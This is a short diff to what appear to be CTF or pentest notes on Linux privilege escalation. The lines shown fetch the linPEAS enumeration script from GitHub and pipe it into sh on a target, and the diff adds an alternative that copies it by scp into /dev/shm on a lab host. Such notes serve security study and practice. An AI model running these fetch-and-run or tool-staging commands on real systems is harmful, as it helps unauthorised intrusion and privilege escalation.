@@ -47,6 +47,10 @@ first ssh into ip THEN
 curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
 ```
 
+OR 
+```
+scp LinEnum/linpeas.sh jan@10.10.37.200:/dev/shm
+```
 
 ## LinEnum
 
